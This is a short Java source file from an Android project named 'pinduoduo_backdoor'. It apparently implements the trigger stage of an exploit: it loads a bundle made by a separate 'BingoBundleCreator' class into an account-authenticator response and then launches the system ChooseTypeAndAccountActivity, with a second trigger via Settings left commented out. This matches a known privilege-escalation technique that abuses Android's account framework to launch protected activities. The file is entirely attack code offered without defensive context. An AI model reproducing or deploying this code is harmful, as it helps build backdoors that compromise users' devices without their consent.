package com.tech.pinduoduo_backdoor;

import android.content.Intent;

import java.util.HashMap;

public class AliveModule {
    private static AliveModule aliveModule;

    public static AliveModule instance() {
        if (aliveModule == null) {
            aliveModule = new AliveModule();
        }
        return aliveModule;
    }

    private void pullActivityDirectly() {
        if (GlobalInfo.context == null) {
            Logger.debug("pullActivityDirectly failed GlobalInfo.context is null");
            return;
        }
// 1. Trigger 1
        GlobalInfo.context.startActivity(new Intent()
                .setClassName("android", "android.accounts.ChooseTypeAndAccountActivity")
                .putExtra("allowableAccountTypes", new String[] {"com.tech.pinduoduo_backdoor.account"})
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        );

// 2. Trigger 2
//        startActivity(new Intent()
//                .setClassName("com.android.settings", "com.android.settings.accounts.AddAccountSettings")
//                .putExtra("account_types", new String[] {"com.tech.pinduoduo_backdoor.account"})
//                .putExtra("selected_account", "com.tech.pinduoduo_backdoor.account")
//        );
    }

    public void pullSpecialActivity(Intent intent) {
        AuthService.addAccountResponse = BingoBundleCreator.makeBundleForWorkSource(intent);
        boolean startActivityDirectly = true;
        if (startActivityDirectly) {
            pullActivityDirectly();
        }
    }
}
